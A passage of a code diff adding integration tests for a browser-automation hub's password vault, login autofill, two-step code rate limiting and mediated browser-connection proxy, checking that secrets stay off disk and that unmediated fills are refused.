+      await vault.setup('r30-3-pw');
+      const grants = GS.create({ dataDir: dataMed, wss: { clients: new Set() }, log: quiet.log });
+      const logins = Lm.create({ vault, grants: () => grants, log: quiet.log });
+      logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW }, { who: 'owner' });
+      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });
+
+      // Part A: Stub keeper WITHOUT `loginChannelFor` -> must refuse 409 login_channel_unmediated with 0 Input.insertText!
+      const stubProf = { id: 'bp-00003030', label: 'StubNoChan', sharing: 'owner', ephemeral: false };
+      const stubWithoutChan = {
+        clock: () => Date.now(),
+        profile: (id) => (id === stubProf.id ? stubProf : null),
+        profileByRef: (r) => (r === stubProf.id || r === 'stub' ? stubProf : null),
+        resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'stub', attachment: { profileId: stubProf.id, alias: 'stub', isDefault: true }, handles: ['stub'], isDefault: true }),
+        attach: async () => ({ ok: true, profile: stubProf, browser: { state: 'ready' }, lease: { profileId: stubProf.id, browserKey: KEY, sessionId: SID, since: 1 }, cdpUrl: fk.wsUrl, env: [] }),
+        leasesFor: () => [{ profileId: stubProf.id, browserKey: KEY, sessionId: SID }],
+        statusFor: () => ({ ephemeral: null, leases: [{ profileId: stubProf.id, browserKey: KEY, sessionId: SID }] }),
+        setFor: () => ({ attachments: [{ profileId: stubProf.id, alias: 'stub', label: stubProf.label, isDefault: true }], handles: ['stub'] }),
+        inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
+        ephemeralFor: () => null,
+        cdpEndpointFor: async () => ({ ok: true, url: fk.wsUrl }),
+        mediator: () => med,
+        onLease: () => () => {},
+        audit() {},
+        noteLeaseUrl() {},
+      };
+      const stubDialogs = Dm.create({
+        keeper: stubWithoutChan,
+        logins,
+        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
+        leaseCountOf: () => 1,
+        conversationOf: () => ({ cid: 'conv-r30-3', name: 'Stub Agent' }),
+        log: quiet,
+      });
+      const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Stub Agent', cwd: tmpRoot, backendSessionId: 'conv-r30-3' }]]);
+      Rm.setup({ keeper: stubWithoutChan, activeSessions: sessions, dialogs: stubDialogs, logins, tasksForSession: () => [] });
+      const app = express();
+      app.use(express.json());
+      app.use(Rm.router);
+      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
+      try {
+        await stubDialogs.arm(stubProf.id);
+        stubDialogs.noteActiveTab?.({ profileId: stubProf.id, browserKey: KEY }, tid);
+        const m0 = fk.mark();
+        const base = `http://127.0.0.1:${srv.address().port}`;
+        const stubFillHttp = await fetch(`${base}/api/agent/browser/fill-vault`, {
+          method: 'POST',
+          headers: { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` },
+          body: JSON.stringify({ profile: stubProf.id, target: '#pw', spec: 'item3r30.example.test#alice/password', targetId: tid }),
+        });
+        const stubFillJson = await stubFillHttp.json();
+        const stubDirectFill = await stubDialogs.fillVaultField(
+          { profileId: stubProf.id, browserKey: KEY },
+          { target: '#pw', spec: 'item3r30.example.test#alice/password', targetId: tid, facts: { conversationKeys: [KEY] } },
+        );
+        const stubInserts = fk.calls().filter((c) => c.seq > m0 && c.method === 'Input.insertText').length;
+
+        // Part B: Restated P5 on real `browser-keeper` (`owner` scope & `instance` mediated never hand raw fk.port/fk.wsUrl)
+        const profOwner = keeper.createProfile({ label: 'NamedOwner', sharing: 'owner' }, { owner: { kind: 'session', id: KEY } });
+        const profInst = keeper.createProfile({ label: 'NamedInst', sharing: 'instance' }, { owner: { kind: 'session', id: KEY } });
+        const atOwner = await keeper.attach({ profileId: profOwner.id, browserKey: KEY, sessionId: SID });
+        const atInst = await keeper.attach({ profileId: profInst.id, browserKey: KEY, sessionId: SID });
+        const rawPortStr = `127.0.0.1:${fk.port}`;
+        const ownerMediatedOnly = Boolean(atOwner.cdpUrl && !atOwner.cdpUrl.includes(rawPortStr) && !JSON.stringify(atOwner.env || []).includes(rawPortStr));
+        const instMediatedOnly = Boolean(atInst.cdpUrl && !atInst.cdpUrl.includes(rawPortStr) && !JSON.stringify(atInst.env || []).includes(rawPortStr));
+
+        const profBare = bareKeeper.createProfile({ label: 'BareOwner', sharing: 'owner' }, { owner: { kind: 'session', id: KEY } });
+        const bareChan = bareKeeper.loginChannelFor({ profileId: profBare.id, browserKey: KEY, action: 'fill' });
+
+        ok(
+          stubFillHttp.status === 409
+            && stubFillJson?.code === 'login_channel_unmediated'
+            && stubDirectFill.ok === false && stubDirectFill.code === 'login_channel_unmediated'
+            && stubInserts === 0
+            && fk.readDomValues(tid).pw === ''
+            && ownerMediatedOnly && instMediatedOnly
+            && bareChan.ok === false && bareChan.code === 'login_channel_unmediated' && bareChan.why === 'no-proxy',
+          'R30-3 (Item 3 no channel fallback + restated P5): keeper without loginChannelFor refuses 409 login_channel_unmediated with 0 Input.insertText, and real browser-keeper hands ONLY mediated URLs on local named profiles',
+          { stubStatus: stubFillHttp.status, stubFillJson, stubDirectFill, stubInserts, ownerCdp: atOwner.cdpUrl, instCdp: atInst.cdpUrl, bareChan },
+        );
+      } finally {
+        srv.close();
+        stubDialogs.shutdown();
+        for (const p of keeper.list().profiles) await keeper.stop(p.id).catch(() => {});
+        for (const p of bareKeeper.list().profiles) await bareKeeper.stop(p.id).catch(() => {});
+        keeper.shutdown();
+        bareKeeper.shutdown();
+        vault.close();
+        await med.shutdown();
+        await fk.close();
+      }
+    }
+
+    // ──────────────────────────────────────────────────────────────────────────
+    // R30-4: Item 4 — Post-lift guards survive Hub restart (0 secrets/hashes on disk; liftshort + liftlong)
+    // ──────────────────────────────────────────────────────────────────────────
+    {
+      const ORIGIN = 'https://item4r30.example.test';
+      const SHORT_PW = 'Sh!7Pw1'; // 7 bytes (< MIN_MASK_BYTES = 8)
+      const LONG_PW = 'LongRestartLift!2026_R30';
+      const dataDir = path.join(tmpRoot, 'd-r30-4');
+      const homeDir = path.join(tmpRoot, 'h-r30-4');
+      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
+      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
+      let clock = 1_765_600_000_000;
+
+      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/short`, mode: { standard: true, omitFilledPassword: true } });
+      const tidShort = fk.targets()[0].targetId;
+      const tidLong = fk.addTarget(`${ORIGIN}/long`);
+      fk.setDom(tidShort, { url: `${ORIGIN}/short`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+      fk.setDom(tidLong, { url: `${ORIGIN}/long`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+      const relay = await startKernelRelay(fk);
+      const rawWs = await openCdpClient(WebSocket, relay.wsUrl);
+
+      const KEY = 'bk-0000304a';
+      const SID = 'sess-r30-4';
+      const TOKEN = 'vsst_r30_4_' + crypto.randomBytes(8).toString('hex');
+
+      const bootHub = async (existingPid = null) => {
+        const med = CM.create({ log: quiet });
+        await med.listen();
+        const keeper = BK.create({
+          dataDir,
+          homeDir,
+          env: () => ({ HOME: homeDir }),
+          liveKeys: () => new Set([KEY]),
+          log: quiet,
+          now: () => clock,
+          install: false,
+          mediator: med,
+        });
+        const prof = existingPid
+          ? keeper.profile(existingPid)
+          : keeper.createProfile({ label: 'R30RestartProf', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
+        const PID = prof.id;
+        const grant = await med.grantFor({ profileId: PID, browserKey: KEY, upstream: relay.wsUrl, targetIds: [tidShort, tidLong], mode: 'scope' });
+        const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
+        if (!existingPid) await vault.setup('r30-4-vault');
+        else await vault.unlock('r30-4-vault');
+        const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
+        const logins = Lm.create({ vault, grants: () => grants, now: () => clock, log: quiet.log });
+        if (!existingPid) {
+          logins.addOwn({ origin: ORIGIN, username: 'shortu', password: SHORT_PW }, { who: 'owner' });
+          logins.addOwn({ origin: ORIGIN, username: 'longu', password: LONG_PW }, { who: 'owner' });
+          grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });
+        }
+        const keeperWrap = {
+          ...keeper,
+          cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: relay.wsUrl } : { ok: false }),
+          leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID }],
+          statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'shop', isDefault: true }] }),
+          setFor: () => ({ defaultId: PID, attachments: [{ profileId: PID, alias: 'shop', label: prof.label, isDefault: true }], handles: ['shop'] }),
+          resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
+          attach: async () => ({ ok: true, profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, cdpUrl: grant.url, env: [`AGENT_BROWSER_CDP=${grant.url}`], pinTab: false, others: 0 }),
+        };
+        const dialogs = Dm.create({
+          keeper: keeperWrap,
+          logins,
+          now: () => clock,
+          liveFillMaxMs: 250,
+          holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
+          leaseCountOf: () => 1,
+          conversationOf: () => ({ cid: 'conv-r30-4', name: 'Agent R30-4' }),
+          log: quiet,
+        });
+        const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Agent R30-4', cwd: tmpRoot, backendSessionId: 'conv-r30-4' }]]);
+        Rm.setup({ keeper: keeperWrap, activeSessions: sessions, dialogs, logins, tasksForSession: () => [] });
+        const app = express();
+        app.use(express.json());
+        app.use(Rm.router);
+        const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
+        const base = `http://127.0.0.1:${srv.address().port}`;
+        const post = async (u, body) => {
+          const r = await fetch(base + u, {
+            method: 'POST',
+            headers: { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` },
+            body: JSON.stringify(body),
+          });
+          return { status: r.status, json: await r.json() };
+        };
+        return {
+          PID,
+          dialogs,
+          post,
+          async stop() {
+            srv.close();
+            dialogs.shutdown();
+            keeper.shutdown();
+            vault.close();
+            await med.shutdown();
+          },
+        };
+      };
+
+      let hub1 = null, hub2 = null;
+      try {
+        const setInput = (targetId, v) => rawWs.evalOnTarget(targetId, `(() => { document.querySelector('#pw').value = ${JSON.stringify(v)}; return 1; })()`);
+
+        hub1 = await bootHub(null);
+        await hub1.dialogs.arm(hub1.PID);
+        hub1.dialogs.bindTab?.({ profileId: hub1.PID, browserKey: KEY }, tidShort);
+        hub1.dialogs.bindTab?.({ profileId: hub1.PID, browserKey: KEY }, tidLong);
+        const PID = hub1.PID;
+
+        const fs1 = await hub1.post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'item4r30.example.test#shortu/password', targetId: tidShort });
+        const fl1 = await hub1.post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'item4r30.example.test#longu/password', targetId: tidLong });
+        clock += 600;
+        await hub1.post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tidShort });
+        await hub1.post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tidLong });
+        await sleep(90);
+
+        const storeRaw = fs.readFileSync(path.join(dataDir, 'browser-profiles.json'), 'utf8');
+        const storeJson = JSON.parse(storeRaw);
+        const savedGuards = storeJson?.loginFences?.[PID]?.guards || [];
+        const shortHash = crypto.createHash('sha256').update(SHORT_PW).digest('hex');
+        const longHash = crypto.createHash('sha256').update(LONG_PW).digest('hex');
+        const diskZeroSecrets = !storeRaw.includes(SHORT_PW) && !storeRaw.includes(LONG_PW) && !storeRaw.includes(shortHash) && !storeRaw.includes(longHash);
+
+        await hub1.stop();
+        hub1 = null;
+        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
+
+        // Page re-renders BOTH secrets while Hub is down!
+        await setInput(tidShort, SHORT_PW);
+        await setInput(tidLong, LONG_PW);
+
+        // Hub 2 boots — very first reads (`booted`, BEFORE explicit armTab!) must recheck, wipe, and refuse 409 login_fill_live!
+        hub2 = await bootHub(PID);
+        const bootShort1 = await hub2.post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tidShort });
+        const bootLong1 = await hub2.post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tidLong });
+        const domShortAfter = fk.readDomValues(tidShort).pw;
+        const domLongAfter = fk.readDomValues(tidLong).pw;
+        const bootShort2 = await hub2.post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tidShort });
+        const bootLong2 = await hub2.post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tidLong });
+
+        ok(
+          fs1.status === 200 && fl1.status === 200
+            && Array.isArray(savedGuards) && savedGuards.length === 2
+            && diskZeroSecrets
+            && bootShort1.status === 409 && bootShort1.json?.code === 'login_fill_live' && domShortAfter === ''
+            && bootLong1.status === 409 && bootLong1.json?.code === 'login_fill_live' && domLongAfter === ''
+            && !JSON.stringify({ bootShort1, bootLong1 }).includes(SHORT_PW)
+            && !JSON.stringify({ bootShort1, bootLong1 }).includes(LONG_PW)
+            && bootShort2.status === 200 && bootLong2.status === 200,
+          'R30-4 (Item 4 post-lift guards survive Hub restart): browser-profiles.json persists guards with 0 secrets/digests, Hub 2 first read catches & wipes both short (<8B) and long post-restart refills, and read #2 lifts to 200',
+          { savedGuardsCount: savedGuards.length, diskZeroSecrets, bootShort1, bootLong1, domShortAfter, domLongAfter, bootShort2, bootLong2 },
+        );
+      } finally {
+        rawWs.close();
+        if (hub1) await hub1.stop();
+        if (hub2) await hub2.stop();
+        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
+        await relay.close();
+        await fk.close();
+      }
+    }
+
+    // ──────────────────────────────────────────────────────────────────────────
+    // R30-5: Item 5 — Road mode census catches string-literal `mode: 'relay'` reusing existing `why: 'shared'` (mutant M6b)
+    // ──────────────────────────────────────────────────────────────────────────
+    {
+      const medSrc = fs.readFileSync(path.join(repoDir, 'src/browser-mediation.js'), 'utf8');
+      const r29Mod = await import(pathToFileURL(path.join(repoDir, 'scripts/fixtures/r29-login-nails.mjs')).href);
+      const mutM6b = medSrc.replace(
+        "  if (!agent) return { mode: null, why: 'human' };",
+        "  if (!agent) return { mode: null, why: 'human' };\n  if (agent === 'relay') return { mode: 'relay', why: 'shared' };",
+      );
+      let realClean = false;
+      let caughtM6b = false;
+      if (typeof r29Mod.inspectLeaseRoadSource === 'function') {
+        const cleanRes = r29Mod.inspectLeaseRoadSource(medSrc, BM);
+        const m6bRes = r29Mod.inspectLeaseRoadSource(mutM6b, BM);
+        realClean = cleanRes.illegalModes.length === 0
+          && cleanRes.modeValues.every((m) => m === 'mediated' || m === 'scope' || m === null);
+        caughtM6b = m6bRes.illegalModes.includes('relay') && m6bRes.modeValues.includes('relay');
+      }
+      ok(
+        mutM6b !== medSrc && realClean && caughtM6b,
+        'R30-5 (Item 5 road mode census kills mutant M6b): inspectLeaseRoadSource enforces mode in {mediated, scope, null} and catches string-literal mode: \'relay\' even when reusing why: \'shared\'',
+        { hasHelper: typeof r29Mod.inspectLeaseRoadSource === 'function', realClean, caughtM6b },
+      );
+    }
+
+    // ──────────────────────────────────────────────────────────────────────────
+    // R30-6: Item 6 — One two-step code pace answer shape across BOTH agent doors
+    // ──────────────────────────────────────────────────────────────────────────
+    {
+      const ORIGIN = 'https://item6r30.example.test';
+      const dataDir = path.join(tmpRoot, 'd-r30-6');
+      const homeDir = path.join(tmpRoot, 'h-r30-6');
+      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
+      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
+      const clock = 1_765_700_000_000;
+
+      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/otp`, mode: { standard: true, omitFilledPassword: true } });
+      const tid = fk.targets()[0].targetId;
+      fk.setDom(tid, { url: `${ORIGIN}/otp`, elements: [{ id: 'otp', tag: 'input', type: 'text', name: 'Code' }] });
+      const med = CM.create({ log: quiet });
+      await med.listen();
+
+      const KEY = 'bk-0000306a';
+      const SID = 'sess-r30-6';
+      const CID = 'conv-r30-6';
+      const TOKEN = 'vsst_r30_6_' + crypto.randomBytes(8).toString('hex');
+
+      const keeper = BK.create({ dataDir, homeDir, env: () => ({ HOME: homeDir }), liveKeys: () => new Set([KEY]), log: quiet, now: () => clock, install: false, mediator: med });
+      const prof = keeper.createProfile({ label: 'R30PaceProf', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
+      const PID = prof.id;
+      const grant = await med.grantFor({ profileId: PID, browserKey: KEY, upstream: fk.wsUrl, targetIds: [tid], mode: 'scope' });
+
+      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
+      await vault.setup('r30-6-pw');
+      const vtotp = VT.create({ dataDir, vault, now: () => clock });
+      vtotp.addEntry({ name: 'shop-2fa', seed: 'JBSWY3DPEHPK3PXP' }, { who: 'owner' });
+      const gTotp = vtotp.grant('shop-2fa', [`session:${CID}`], {
+        who: 'owner',
+        by: 'user:owner',
+        runOf: (id) => (id === CID ? VT.runOfToken(TOKEN) : null),
+      });
+
+      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
+      const logins = Lm.create({ vault, grants: () => grants, totpCode: (n, o) => vtotp.codeForLogin(n, o), now: () => clock, log: quiet.log });
+      logins.addOwn({ origin: ORIGIN, username: 'alice', password: 'PaceUserPw!2026', totpName: 'shop-2fa' }, { who: 'owner' });
+      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'conversation', key: CID }], except: [] });
+
+      const keeperWrap = {
+        ...keeper,
+        cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: fk.wsUrl } : { ok: false }),
+        leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID }],
+        statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'shop', isDefault: true }] }),
+        setFor: () => ({ defaultId: PID, attachments: [{ profileId: PID, alias: 'shop', label: prof.label, isDefault: true }], handles: ['shop'] }),
+        resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
+        attach: async () => ({ ok: true, profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, cdpUrl: grant.url, env: [`AGENT_BROWSER_CDP=${grant.url}`], pinTab: false, others: 0 }),
+      };
+      const dialogs = Dm.create({
+        keeper: keeperWrap,
+        logins,
+        now: () => clock,
+        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
+        leaseCountOf: () => 1,
+        conversationOf: () => ({ cid: CID, name: 'Agent R30-6' }),
+        log: quiet,
+      });
+      const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Agent R30-6', cwd: tmpRoot, backendSessionId: CID }]]);
+      Rm.setup({ keeper: keeperWrap, activeSessions: sessions, dialogs, logins, tasksForSession: () => [] });
+      const app = express();
+      app.use(express.json());
+      VRm.registerVaultRoutes(app, {
+        vault,
+        activeSessions: sessions,
+        totp: vtotp,
+        logins,
+        callerOf: (tok) => (tok === TOKEN ? { conversationId: CID, groups: [], live: true, scope: SID, conv: CID } : null),
+        log: quiet.log,
+      });
+      app.use(Rm.router);
+      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
+      try {
+        await dialogs.arm(PID);
+        dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, tid);
+        dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tid);
+        const base = `http://127.0.0.1:${srv.address().port}`;
+        const hdr = { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` };
+
+        let preOkCount = 0;
+        for (let i = 0; i < 10; i++) {
+          const preV = await fetch(`${base}/api/agent/vault/totp/shop-2fa`, { headers: hdr });
+          const preF = await fetch(`${base}/api/agent/browser/fill-vault`, {
+            method: 'POST',
+            headers: hdr,
+            body: JSON.stringify({ profile: PID, target: '#otp', spec: 'item6r30.example.test#alice/otp', targetId: tid }),
+          });
+          if (preV.status === 200) preOkCount++;
+          if (preF.status === 200) preOkCount++;
+        }
+        const rVault = await fetch(`${base}/api/agent/vault/totp/shop-2fa`, { headers: hdr });
+        const jVault = await rVault.json();
+        const rFill = await fetch(`${base}/api/agent/browser/fill-vault`, {
+          method: 'POST',
+          headers: hdr,
+          body: JSON.stringify({ profile: PID, target: '#otp', spec: 'item6r30.example.test#alice/otp', targetId: tid }),
+        });
+        const jFill = await rFill.json();
+
+        const keysVault = Object.keys(jVault || {}).sort().join(',');
+        const keysFill = Object.keys(jFill || {}).sort().join(',');
+        const expectErr = `too many two-step codes requested in the last minute — wait ${jVault?.secondsLeft} seconds, then try again`;
+
+        ok(
+          gTotp.ok === true
+            && preOkCount === 20
+            && rVault.status === 429 && rFill.status === 429
+            && keysVault === 'code,error,ok,retryInMs,secondsLeft'
+            && keysFill === keysVault
+            && jVault.ok === false && jFill.ok === false
+            && jVault.code === 'code_paced' && jFill.code === 'code_paced'
+            && Number.isInteger(jVault.secondsLeft) && jVault.secondsLeft >= 1
+            && jFill.secondsLeft === jVault.secondsLeft
+            && jVault.error === expectErr && jFill.error === expectErr,
+          'R30-6 (Item 6 unified two-step code pace shape): GET /api/agent/vault/totp/:name and POST /api/agent/browser/fill-vault share the 20/min counter and return identical 429 code_paced shape + words + secondsLeft',
+          { gTotp, preOkCount, statusVault: rVault.status, statusFill: rFill.status, jVault, jFill },
+        );
+      } finally {
+        srv.close();
+        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
+        dialogs.shutdown();
+        keeper.shutdown();
+        vault.close();
+        await med.shutdown();
+        await fk.close();
+      }
+    }
+
+    // ──────────────────────────────────────────────────────────────────────────
+    // R30-7: Item 7 — `vibespace-vault --help` states where `--kind login` works
+    // ──────────────────────────────────────────────────────────────────────────
+    {
+      const vaultBin = path.join(repoDir, 'data/bin/vibespace-vault');
+      const helpRun = spawnSync(process.execPath, [vaultBin, '--help'], { encoding: 'utf8', timeout: 5000 });
+      const helpOut = String(helpRun.stdout || '') + String(helpRun.stderr || '');
+      const kindMatch = helpOut.match(/--kind\s+login[\s\S]{0,600}/);
+      const kindSection = kindMatch ? kindMatch[0] : '';
+      ok(
+        helpRun.status === 0
+          && /local mediated named browser profile/i.test(kindSection)
+          && /vibespace-browser use <profile>/.test(kindSection)
+          && /temporary browser/i.test(kindSection),
+        'R30-7 (Item 7 vibespace-vault --help on --kind login): help text explicitly states login requests/fills work only on a local mediated named browser profile (vibespace-browser use <profile>) and not in the temporary browser',
+        { status: helpRun.status, kindSection },
+      );
+    }
+
+    // ──────────────────────────────────────────────────────────────────────────
+    // R30-8: Item 8 — `docs/kb-bugfix-invariants.md` preserves master's unrelated lines
+    // ──────────────────────────────────────────────────────────────────────────
+    {
+      const kb = fs.readFileSync(path.join(repoDir, 'docs/kb-bugfix-invariants.md'), 'utf8');
+      const hasSelectedLine = kb.includes('`failed` / `selected` / `partial` / `absent`') && !kb.includes('`failed` / `typed` / `partial` / `absent`');
+      const hasMasterBlankBeforeEveryCheck = kb.includes('\n\n\n## EVERY CHECK OF A NEW CLAUDE CODE VOIDED')
+        && !kb.includes('\n\n\n\n## EVERY CHECK OF A NEW CLAUDE CODE VOIDED');
+      ok(
+        hasSelectedLine && hasMasterBlankBeforeEveryCheck,
+        'R30-8 (Item 8 clean rebase of docs/kb-bugfix-invariants.md): preserves master\'s exact `failed` / `selected` / `partial` / `absent` wording and exact blank lines before EVERY CHECK heading',
+        { hasSelectedLine, hasMasterBlankBeforeEveryCheck },
+      );
+    }
+
+    // ──────────────────────────────────────────────────────────────────────────
+    // R30-X2: Extra Scene 2 — Job token (`jbt_`) through real routes + real `browser-keeper` `loginChannelFor`
+    // ──────────────────────────────────────────────────────────────────────────
+    {
+      const ORIGIN = 'https://jbtr30.example.test';
+      const PW = 'JobTokenFill!2026_R30';
+      const dataDir = path.join(tmpRoot, 'd-r30-x2');
+      const homeDir = path.join(tmpRoot, 'h-r30-x2');
+      const binDir = path.join(tmpRoot, 'bin-r30-x2');
+      const abState = path.join(tmpRoot, 'ab-r30-x2');
+      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
+      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
+      installFakeAgentBrowser(binDir, abState);
+
+      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: true, omitFilledPassword: true } });
+      const tid = fk.targets()[0].targetId;
+      fk.setDom(tid, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+      const relay = await startKernelRelay(fk);
+      const med = CM.create({ log: quiet });
+      await med.listen();
+
+      const KEY_EPH = 'bk-000032ea';
+      const KEY_EXT = 'bk-000032eb';
+      const KEY_LOC = 'bk-000032ec';
+      const JBT_EPH = 'jbt_r30_eph_' + crypto.randomBytes(8).toString('hex');
+      const JBT_EXT = 'jbt_r30_ext_' + crypto.randomBytes(8).toString('hex');
+      const JBT_LOC = 'jbt_r30_loc_' + crypto.randomBytes(8).toString('hex');
+
+      const rtEnv = {
+        FAKE_AB_STATE: abState,
+        FAKE_CDP_URL: relay.wsUrl,
+        FAKE_TARGET_ID: tid,
+        PATH: `${binDir}:${process.env.PATH || '/usr/bin:/bin'}`,
+        HOME: homeDir,
+      };
+      const keeper = BK.create({
+        dataDir,
+        homeDir,
+        env: () => rtEnv,
+        liveKeys: () => new Set([KEY_EPH, KEY_EXT, KEY_LOC]),
+        runtime: BF.createBrowserRuntime({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
+        facts: BF.createBrowserFacts({ env: rtEnv, cmd: path.join(binDir, 'agent-browser') }),
+        log: quiet,
+        install: false,
+        mediator: med,
+      });
+      const profExt = keeper.createProfile({ label: 'ExtJobProf', provider: 'cdp', cdpPort: relay.port }, { owner: { kind: 'instance', id: null } });
+      const profLoc = keeper.createProfile({ label: 'LocJobProf', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
+      keeper.setPin(KEY_EXT, profExt.id);
+      keeper.setPin(KEY_LOC, profLoc.id);
+
+      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
+      await vault.setup('r30-x2-pw');
+      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
+      const logins = Lm.create({ vault, grants: () => grants, log: quiet.log });
+      logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW }, { who: 'owner' });
+      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });
+
+      const dialogs = Dm.create({
+        keeper,
+        logins,
+        holdersOf: Dm.holdersOfKeeper(keeper),
+        leaseCountOf: (pid) => keeper.list().leases.filter((l) => l.profileId === pid).length,
+        log: quiet,
+      });
+      const jobsByTok = new Map([
+        [JBT_EPH, { id: 'job-eph', state: 'up', name: 'JobEph', owner: { conversation: { id: 'conv-j-eph' } } }],
+        [JBT_EXT, { id: 'job-ext', state: 'up', name: 'JobExt', owner: { conversation: { id: 'conv-j-ext' } } }],
+        [JBT_LOC, { id: 'job-loc', state: 'up', name: 'JobLoc', owner: { conversation: { id: 'conv-j-loc' } } }],
+      ]);
+      const jobsById = new Map([...jobsByTok.values()].map((j) => [j.id, j]));
+      const sessions = new Map([
+        ['s-j-eph', { agentToken: 'vsst_j_eph', _browserKey: KEY_EPH, _browserVariant: 'D', name: 'OwnerEph', cwd: tmpRoot, backendSessionId: 'conv-j-eph', claudeSessionId: 'conv-j-eph' }],
+        ['s-j-ext', { agentToken: 'vsst_j_ext', _browserKey: KEY_EXT, _browserVariant: 'D', name: 'OwnerExt', cwd: tmpRoot, backendSessionId: 'conv-j-ext', claudeSessionId: 'conv-j-ext' }],
+        ['s-j-loc', { agentToken: 'vsst_j_loc', _browserKey: KEY_LOC, _browserVariant: 'D', name: 'OwnerLoc', cwd: tmpRoot, backendSessionId: 'conv-j-loc', claudeSessionId: 'conv-j-loc' }],
+      ]);
+      Rm.setup({
+        keeper,
+        activeSessions: sessions,
+        getJobs: () => ({ ready: true, jobByToken: (t) => jobsByTok.get(t) || null, jobs: jobsById }),
+        dialogs,
+        logins,
+        tasksForSession: () => [],
+      });
+      const app = express();
+      app.use(express.json());
+      app.use(Rm.router);
+      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
+      try {
+        const base = `http://127.0.0.1:${srv.address().port}`;
+        const jbtPost = async (tok, u, body) => {
+          const r = await fetch(base + u, {
+            method: 'POST',
+            headers: { 'content-type': 'application/json', authorization: `Bearer ${tok}` },
+            body: JSON.stringify(body),
+          });
+          return { status: r.status, json: await r.json() };
+        };
+
+        const m0 = fk.mark();
+        // 1) Owner has no named profile pinned -> refused `job_no_profile`
+        const rEphPrep = await jbtPost(JBT_EPH, '/api/agent/browser/fill-vault', { prepare: true, target: '#pw', spec: 'jbtr30.example.test#alice/password' });
